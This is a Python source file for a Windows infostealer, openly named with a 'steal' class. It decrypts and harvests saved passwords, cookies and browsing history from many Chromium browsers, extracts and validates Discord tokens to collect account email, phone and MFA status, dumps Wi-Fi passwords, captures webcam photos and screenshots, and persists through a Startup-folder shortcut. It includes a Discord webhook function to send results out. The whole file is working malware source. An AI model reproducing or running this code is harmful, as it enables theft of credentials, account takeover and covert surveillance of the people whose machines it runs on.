import os
import re
import cv2
import json
import pyaes
import shutil
import base64
import ctypes
import random
import sqlite3
import requests
import subprocess
import pyautogui
import threading

from typing import List, Dict
from win32com.client import Dispatch
from urllib3 import PoolManager, disable_warnings

# Disable warnings from urllib3
disable_warnings()

class Util:
    @staticmethod
    def random_string(length: int = 5, invisible: bool = False) -> str:
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def task_kill(*tasks: str) -> None:
        tasks = [task.lower() for task in tasks]
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode().split('\r\n\r\n')
        for i in out:
            try:
                name, pid = i.split('\r\n')[:2]
                name = name.split()[-1]
                pid = int(pid.split()[-1])
                if name.lower().replace('.exe', '') in tasks:
                    subprocess.run(f'taskkill /F /PID {pid}', shell=True, capture_output=True)
            except (IndexError, ValueError):
                continue

    @staticmethod
    def decrypt_data(encrypted_data: bytes, entropy: str = None) -> bytes:
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]

        data_in = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        data_out = DATA_BLOB()
        p_entropy = None

        if entropy:
            entropy = entropy.encode('utf-16')
            p_entropy = DATA_BLOB(len(entropy), ctypes.cast(entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(data_in), None, ctypes.byref(p_entropy) if p_entropy else None, None, None, 0, ctypes.byref(data_out)):
            data = (ctypes.c_ubyte * data_out.cbData)()
            ctypes.memmove(data, data_out.pbData, data_out.cbData)
            ctypes.windll.Kernel32.LocalFree(data_out.pbData)
            return bytes(data)
        raise ValueError('Invalid encrypted data provided!')

class ChromiumBrowser:
    def __init__(self, browser_path: str) -> None:
        if not os.path.isdir(browser_path):
            raise NotADirectoryError(f'Browser path {browser_path} not found!')
        self.browser_path = browser_path
        self.encryption_key = self.get_encryption_key()

    def get_encryption_key(self) -> bytes:
        local_state_path = os.path.join(self.browser_path, 'Local State')
        if os.path.isfile(local_state_path):
            with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as file:
                local_state = json.load(file)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            return Util.decrypt_data(encrypted_key)
        return None

    def decrypt(self, buffer: bytes) -> str:
        version = buffer.decode(errors='ignore')
        if version.startswith(('v10', 'v11')):
            iv, cipher_text = buffer[3:15], buffer[15:]
            return pyaes.AESModeOfOperationGCM(self.encryption_key, iv).decrypt(cipher_text)[:-16].decode(errors='ignore')
        return str(Util.decrypt_data(buffer))

    def get_passwords(self) -> List[tuple[str, str, str]]:
        passwords = []
        login_file_paths = [os.path.join(root, file) for root, _, files in os.walk(self.browser_path) for file in files if file.lower() == 'login data']
        for path in login_file_paths:
            with sqlite3.connect(shutil.copy(path, os.path.join(os.getenv('temp'), Util.random_string(10) + '.tmp'))) as db:
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for url, username, password in cursor.fetchall():
                    password = self.decrypt(password)
                    if url and username and password:
                        passwords.append((url, username, password))
        return passwords

    def get_cookies(self) -> List[tuple[str, str, str, str, int]]:
        cookies = []
        cookies_file_paths = [os.path.join(root, file) for root, _, files in os.walk(self.browser_path) for file in files if file.lower() == 'cookies']
        for path in cookies_file_paths:
            with sqlite3.connect(shutil.copy(path, os.path.join(os.getenv('temp'), Util.random_string(10) + '.tmp'))) as db:
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                for host, name, path, cookie, expiry in cursor.fetchall():
                    cookie = self.decrypt(cookie)
                    if host and name and cookie:
                        cookies.append((host, name, path, cookie, expiry))
        return cookies

    def get_history(self) -> List[tuple[str, str, int]]:
        history = []
        history_file_paths = [os.path.join(root, file) for root, _, files in os.walk(self.browser_path) for file in files if file.lower() == 'history']
        for path in history_file_paths:
            with sqlite3.connect(shutil.copy(path, os.path.join(os.getenv('temp'), Util.random_string(10) + '.tmp'))) as db:
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')
                for url, title, visit_count, last_visit_time in cursor.fetchall():
                    if url and title and visit_count and last_visit_time:
                        history.append((url, title, visit_count, last_visit_time))
        return sorted(history, key=lambda x: x[3], reverse=True)

class SystemInfo:
    @staticmethod
    def get_wifi_passwords() -> dict:
        profiles, passwords = [], {}
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                profiles.append(line.split(':')[1].strip())
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line.split(':')[1].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def take_webcam_photos(path: str) -> None:
        if not os.path.exists(path):
            os.makedirs(path)
        captures = [cv2.VideoCapture(index, cv2.CAP_DSHOW) for index in range(cv2.VideoCapture().get(cv2.CAP_DSHOW))]
        for cap in captures:
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(os.path.join(path, f'webcam-{random.randint(1, 32)}.png'), frame)
            cap.release()
        cv2.destroyAllWindows()

    @staticmethod
    def create_startup_shortcut() -> None:
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_path = os.path.abspath(__file__)
        shortcut_path = os.path.join(startup_folder, f'{os.path.basename(script_path)}.lnk')
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.save()

    @staticmethod
    def take_screenshot(path: str) -> None:
        try:
            pyautogui.screenshot().save(path)
        except Exception:
            pass

class discord:
    def __init__(self) -> None:
        self.http_client = PoolManager(cert_reqs='CERT_NONE')
        self.tokens = self.get_tokens()
        self.user_data = self.fetch_user_data()

    def get_headers(self, token: str = None) -> dict:
        headers = {
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'
        }
        if token:
            headers['authorization'] = token
        return headers

    def get_tokens(self) -> list:
        tokens = []
        paths = {
            'Discord': os.path.join(os.getenv('appdata'), 'discord'),
            'Discord Canary': os.path.join(os.getenv('appdata'), 'discordcanary'),
            'Lightcord': os.path.join(os.getenv('appdata'), 'Lightcord'),
            'Discord PTB': os.path.join(os.getenv('appdata'), 'discordptb'),
            'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable')
        }
        threads = []

        def extract_tokens(path):
            nonlocal tokens
            if os.path.isdir(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.ldb') or file.endswith('.log'):
                            with open(os.path.join(root, file), 'r', errors='ignore') as f:
                                for line in f.readlines():
                                    tokens.extend(re.findall(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}', line.strip()))
                                    tokens.extend(re.findall(r'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\"]*', line.strip()))

        for path in paths.values():
            t = threading.Thread(target=extract_tokens, args=(path,))
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()

        return list(set(tokens))

    def fetch_user_data(self) -> List[dict]:
        user_data = []
        for token in self.tokens:
            response = self.http_client.request('GET', 'https://discord.com/api/v9/users/@me', headers=self.get_headers(token.strip()))
            if response.status == 200:
                data = json.loads(response.data.decode(errors='ignore'))
                user_data.append({
                    'username': f"{data['username']}#{data['discriminator']}",
                    'id': data['id'],
                    'email': data.get('email', '(No Email)').strip(),
                    'phone': data.get('phone', '(No Phone Number)'),
                    'verified': data['verified'],
                    'mfa_enabled': data['mfa_enabled'],
                    'token': token,
                    'nitro': data.get('premium_type', 0)
                })
        return user_data

    def user(self) -> List[str]:
        return [user['username'] for user in self.user_data]

    def id(self) -> List[str]:
        return [user['id'] for user in self.user_data]

    def email(self) -> List[str]:
        return [user['email'] for user in self.user_data]

    def phone(self) -> List[str]:
        return [user['phone'] for user in self.user_data]

    def verified(self) -> List[bool]:
        return [user['verified'] for user in self.user_data]

    def mfa(self) -> List[bool]:
        return [user['mfa_enabled'] for user in self.user_data]

    def token(self) -> List[str]:
        return [user['token'] for user in self.user_data]

    def nitro(self) -> List[int]:
        return [user['nitro'] for user in self.user_data]

def send_webhook(webhook_url: str, username: str, avatar_url: str, embed_color: int, title: str, description: str) -> None:
    payload = {
        'username': username,
        'avatar_url': avatar_url,
        'embeds': [{
            'color': embed_color,
            'title': title,
            'description': description
        }]
    }
    requests.post(webhook_url, json=payload)

def capture_webcam_photos(path: str) -> None:
    SystemInfo.take_webcam_photos(path)

def get_wifi_passwords() -> dict:
    return SystemInfo.get_wifi_passwords()

def create_startup_shortcut() -> None:
    SystemInfo.create_startup_shortcut()

def take_screenshot(path: str) -> None:
    SystemInfo.take_screenshot(path)

class steal:
    def grab_passwords() -> List[tuple[str, str, str]]:
        paths = {
            'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'),
            'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'),
            'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'),
            'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'),
            'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'),
            'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'),
            'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'),
            'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'),
            'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'),
            'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'),
            'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')
        }
        passwords = []

        def run_browser(browser_path: str) -> None:
            nonlocal passwords
            try:
                browser = ChromiumBrowser(browser_path)
                passwords.extend(browser.get_passwords())
            except Exception:
                pass

        threads = []
        for path in paths.values():
            if os.path.isdir(path):
                t = threading.Thread(target=run_browser, args=(path,))
                t.start()
                threads.append(t)
        for t in threads:
            t.join()

        return passwords

    def grab_cookies() -> List[tuple[str, str, str, str, int]]:
        paths = {
            'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'),
            'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'),
            'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'),
            'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'),
            'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'),
            'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'),
            'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'),
            'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'),
            'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'),
            'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'),
            'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')
        }
        cookies = []

        def run_browser(browser_path: str) -> None:
            nonlocal cookies
            try:
                browser = ChromiumBrowser(browser_path)
                cookies.extend(browser.get_cookies())
            except Exception:
                pass

        threads = []
        for path in paths.values():
            if os.path.isdir(path):
                t = threading.Thread(target=run_browser, args=(path,))
                t.start()
                threads.append(t)
        for t in threads:
            t.join()

        return cookies

    def grab_history() -> List[tuple[str, str, int]]:
        paths = {
            'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'),
            'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'),
            'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'),
            'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'),
            'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'),
            'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'),
            'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'),
            'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'),
            'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'),
            'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'),
            'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')
        }
        history = []

        def run_browser(browser_path: str) -> None:
            nonlocal history
            try:
                browser = ChromiumBrowser(browser_path)
                history.extend(browser.get_history())
            except Exception:
                pass

        threads = []
        for path in paths.values():
            if os.path.isdir(path):
                t = threading.Thread(target=run_browser, args=(path,))
                t.start()
                threads.append(t)
        for t in threads:
            t.join()

        return history